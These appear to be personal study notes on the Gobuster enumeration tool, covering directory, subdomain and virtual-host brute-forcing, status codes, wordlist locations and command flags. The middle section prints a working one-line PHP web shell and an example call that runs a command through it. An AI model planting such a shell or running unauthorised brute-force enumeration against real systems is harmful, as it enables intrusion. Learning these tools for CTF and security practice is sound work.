Gobuster
Gobuster is a Brute-force Enumerator.
It is used when:
You know a target exists
But you Don't know what paths exist on it
It is a discovery tool.


Where Gobuster Is Used?

1. Directory Enumeration (Folders and Files)
	Used When:-
	- Website is traditional(Apache,PHP,etc)
	- CTF Machines
	- To find hidden Directories
2.    Subdomain Enumeration (subdomains)
- Target: https://example.com
- But maybe:
- dev.example.com
- internal.example.com
- https://vpn.example.com
- Gobuster can brute-force subdomains
3.    Virtual Host Brute Force
One IP -> Multiple Hidden Websites
You can brute-force hidden host headers




Understanding Output

- 200 OK - Accessible and exists
- 301 / 302 Redirects - Exists but redirects
Example: /assets → maybe redirects to /assets/
- 403 Forbidden - It exists but access denied
- 404 Not Found -Ignore

Web Shell - It is a small PHP Script like -
<?php system($_GET['cmd']); ?>
If uploaded, attacker can run:
shell.php?cmd=whoami


Wordlists

This is the path where the wordlist is present so i am just writing it down for my references
ls /usr/share/wordlists


For Commonly used wordlists

ls /usr/share/wordlists/dirb/
You should see:
common.txt
big.txt
small.txt

Bigger Wordlists

ls /usr/share/wordlists/dirbuster/

Rockyou (Passwords – For Bruteforce Later)

ls /usr/share/wordlists/rockyou.txt


Commands

1. Directory Enumeration - 
gobuster dir -u http://target.com -w /path/to/wordlist.txt
dir -> directory brute-force mode
-u -> target URL
-w -> wordlist file



2. Ignore Status Code
-b 404
Ignore responses that return 404.

3. Only show the status Code
-s 200,301,302,403
Only shows these response codes

4. Add File extensions 
-x php,txt,html
Which means check for 
- admin.php
- login.php
- config.txt

5. Change Threads 
-t 50 Number of threads (how many requests at the same time)
Use 50 parallel Requests.
Default is 10.

6. Exclude Length 
--exclude-length <code size>
Ignores Responses that have exactly that size.

7. Use HTTPS
-k 
Ignore the SSL Certificate errors

8. DNS Mode
gobuster dns -d example.com -w subdomains.txt

dns -> DNS brute-force mode
-d -> Domain name
-w -> Wordlist

9. Virtual Host mode
gobuster vhost -u http://target -w wordlist.txt
Used when - Multiple websites hosted by the same IP address

10. Save the Output to file
-o results.txt
